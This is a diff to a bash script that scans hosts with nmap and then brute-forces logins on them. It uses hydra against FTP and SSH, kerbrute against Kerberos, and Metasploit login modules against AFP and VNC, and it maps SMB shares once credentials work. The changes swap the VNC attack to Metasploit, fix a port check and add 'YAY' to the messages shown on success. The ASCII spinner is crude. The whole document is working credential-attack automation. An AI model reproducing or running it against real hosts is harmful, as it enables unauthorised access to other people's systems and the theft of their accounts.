@@ -146,12 +146,12 @@ scan_res=$(nmap $line -p 21,22,25,88,389,445,548,1433,3389,5900)
 
 ftp_svc=$(echo "$scan_res" | grep "21/tcp   open ")
 ssh_svc=$(echo "$scan_res" | grep "22/tcp   open ")
-smtp_svc=$(echo "$scan_res" | grep "25/tcp   open")
+#smtp_svc=$(echo "$scan_res" | grep "25/tcp   open")
 kerb_svc=$(echo "$scan_res" | grep "88/tcp   open")
-#ldap_svc=$(echo "$scan_res" | grep "389/tcp  open")
+ldap_svc=$(echo "$scan_res" | grep "389/tcp  open")
 smb_svc=$(echo "$scan_res" | grep "445/tcp  open")
 afp_svc=$(echo "$scan_res" | grep "548/tcp  open")
-vnc_svc=$(echo "$scan_res" | grep "1433/tcp open")
+vnc_svc=$(echo "$scan_res" | grep "5900/tcp open")
 mssql_svc=$(echo "$scan_res" | grep "1433/tcp open")
 rdp_svc=$(echo "$scan_res" | grep "3389/tcp open")
 
@@ -181,7 +181,7 @@ if [[ ! -z "$ftp_svc" ]];then
 		valid_user_pass_ftp=$(cat valid_user_pass_ftp)
 
 		if [[ ! -z "$valid_user_pass_ftp" ]];then
-			echo "===> FTP Open : Valid User(s) found :"
+			echo "===> FTP Open : YAY Valid User(s) found :"
 			echo "$valid_user_pass_ftp"
 		else 
 			echo "===> FTP Open : No Valid FTP User/Password found"
@@ -197,7 +197,7 @@ if [[ ! -z "$ftp_svc" ]];then
 			valid_user_pass_ftp=$(cat valid_user_pass_ftp)
 			
 			if [[ ! -z "$valid_user_pass_ftp" ]];then
-				echo "===> FTP Open : Valid User/Password found :"
+				echo "===> FTP Open : YAY Valid User/Password found :"
 				echo "$valid_user_pass_ftp"
 			else 
 				echo "===> FTP Open : No Valid FTP User/Password found"
@@ -225,7 +225,7 @@ if [[ ! -z "$ssh_svc" ]];then
 		hydra -C userpass -I -t 4 -V $line ssh | grep "login:"  > valid_user_pass_ssh & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in "[==D     8]" "[]8===D  []" "[] 8===D []" "[]  8===D[]" "[]   8===[]" "[D     8==]" "[=D     8=]" ; do echo -en "\b\b\b\b\b\b\b\b\b\b\b\b$X"; sleep 0.1; done; done
 		valid_user_pass_ssh=$(cat valid_user_pass_ssh)
 		if [[ ! -z "$valid_user_pass_ssh" ]];then
-			echo "===> SSH Open : Valid SSH User/Password found"
+			echo "===> SSH Open : YAY Valid SSH User/Password found"
 			echo ""
 			echo "$valid_user_pass_ssh"
 		else 
@@ -242,7 +242,7 @@ if [[ ! -z "$ssh_svc" ]];then
 			valid_user_pass_ssh=$(cat valid_user_pass_ssh)
 			if [[ ! -z "$valid_user_pass_ssh" ]];then
 				echo ""
-				echo "===> SSH Open : Valid SSH User/Password found"
+				echo "===> SSH Open : YAY Valid SSH User/Password found"
 				echo "$valid_user_pass_ssh"
 			else 
 				echo ""
@@ -284,7 +284,7 @@ if [[ ! -z "$kerb_svc" ]];then
 	/root/go/bin/kerbrute -d $url bruteforce userpass | grep "VALID LOGIN" | cut -d " " -f 8 > valid_user_pass_kerbrute & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in "[==D     8]" "[]8===D  []" "[] 8===D []" "[]  8===D[]" "[]   8===[]" "[D     8==]" "[=D     8=]" ; do echo -en "\b\b\b\b\b\b\b\b\b\b\b\b$X"; sleep 0.1; done; done
 	valid_user_pass_kerbrute=$(cat valid_user_pass_kerbrute)
 	if [[ ! -z "$valid_user_pass_kerbrute" ]];then
-		echo "===> Kerberos Open : Valid User(s)/Password(s) Found"
+		echo "===> Kerberos Open : YAY Valid User(s)/Password(s) Found"
 		echo "$valid_user_pass_kerbrute"
 	else
 		echo "===> Kerberos Open : No Valid User/Password Found"
@@ -305,7 +305,7 @@ if [[ ! -z "$smb_svc" ]];then
 #map if user found
 	if [[ ! -z "$valid_user_pass_smb" ]];then
 		echo ""
-		echo "===> SMB Open : Valid User(s)/Password(s) Found Let's map"
+		echo "===> SMB Open : YAY Valid User(s)/Password(s) Found Let's map"
 		echo "$valid_user_pass_smb"
 		for validuserpass in $(cat valid_user_pass_smb)
 		do
@@ -326,12 +326,12 @@ fi
 #AFP
 if [[ ! -z "$afp_svc" ]];then
 	echo "===> AFP Open : BF With MSF MODULE AFP_Login"
-	msfconsole -q -x "use auxiliary/scanner/afp/afp_login;set RHOSTS $line; set USER_FILE /root/ldapshit/users;set USER_AS_PASS 1;set THREADS 10; exploit; exit;" | grep "Successful"  | cut -d " " -f 8 > valid_user_pass_afp & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in "[==D     8]" "[]8===D  []" "[] 8===D []" "[]  8===D[]" "[]   8===[]" "[D     8==]" "[=D     8=]" ; do echo -en "\b\b\b\b\b\b\b\b\b\b\b\b$X"; sleep 0.1; done; done
+	timeout 600 msfconsole -q -x "use auxiliary/scanner/afp/afp_login;set RHOSTS $line; set USER_FILE /root/ldapshit/users;set USER_AS_PASS 1;set THREADS 10; exploit; exit;" | grep "Successful"  | cut -d " " -f 8 > valid_user_pass_afp & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in "[==D     8]" "[]8===D  []" "[] 8===D []" "[]  8===D[]" "[]   8===[]" "[D     8==]" "[=D     8=]" ; do echo -en "\b\b\b\b\b\b\b\b\b\b\b\b$X"; sleep 0.1; done; done
 	valid_user_pass_afp=$(cat valid_user_pass_afp)
 
 	if [[ ! -z "$valid_user_pass_afp" ]];then
 		echo ""
-		echo "===> AFP Open : Valid User(s)/Password(s) Found"
+		echo "===> AFP Open : YAY Valid User(s)/Password(s) Found"
 		echo "$valid_user_pass_afp"
 	else
 		echo "===> AFP Open : No Valid User/Password Found"
@@ -365,13 +365,25 @@ if [[ ! -z "$vnc_svc" ]];then
 	if [ "$nbusers" -lt 80 ]; then 
 		echo "===> VNC Open : Few Users , Let's go"
 		bash create_user_password_list.sh > userpass
-		hydra -C userpass -I -V $line vnc & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in "[==D     8]" "[]8===D  []" "[] 8===D []" "[]  8===D[]" "[]   8===[]" "[D     8==]" "[=D     8=]" ; do echo -en "\b\b\b\b\b\b\b\b\b\b\b\b$X"; sleep 0.1; done; done
+		msfconsole -q -x "use auxiliary/scanner/vnc/vnc_login;set RHOSTS $line; set USER_FILE /root/ldapshit/users;set USER_AS_PASS 1;set THREADS 1;set PASS_FILE ''; set USERNAME ''; exploit; exit;" | grep "Successful"  | cut -d " " -f 11 > valid_user_pass_vnc & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in "[==D     8]" "[]8===D  []" "[] 8===D []" "[]  8===D[]" "[]   8===[]" "[D     8==]" "[=D     8=]" ; do echo -en "\b\b\b\b\b\b\b\b\b\b\b\b$X"; sleep 0.1; done; done
+		valid_user_pass_vnc=$(cat valid_user_pass_vnc)
+
+		if [[ ! -z "$valid_user_pass_vnc" ]];then
+			echo ""
+			echo "===> VNC Open : YAY Valid User(s)/Password(s) Found"
+			echo "$valid_user_pass_vnc"
+		else
+			echo "===> VNC Open : No Valid User/Password Found"
+		fi
+
+	
+
 	else
 		echo "===> VNC Open : Lot of users, are you sure (yes/no)"
 		read -t 5 vncbrute
 		if [ "$vncbrute" == "yes" ];then
 			bash create_user_password_list.sh > userpass
-			hydra -C userpass -I -V $line vnc
+			msfconsole -q -x "use auxiliary/scanner/vnc/vnc_login;set RHOSTS $line; set USER_FILE /root/ldapshit/users;set USER_AS_PASS 1;set THREADS 1;set PASS_FILE ''; set USERNAME ''; exploit; exit;" | grep "Successful"  | cut -d " " -f 11 > valid_user_pass_vnc & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in "[==D     8]" "[]8===D  []" "[] 8===D []" "[]  8===D[]" "[]   8===[]" "[D     8==]" "[=D     8=]" ; do echo -en "\b\b\b\b\b\b\b\b\b\b\b\b$X"; sleep 0.1; done; done
 		else
 			echo "===> VNC Bruteforce Aborted"
 		fi
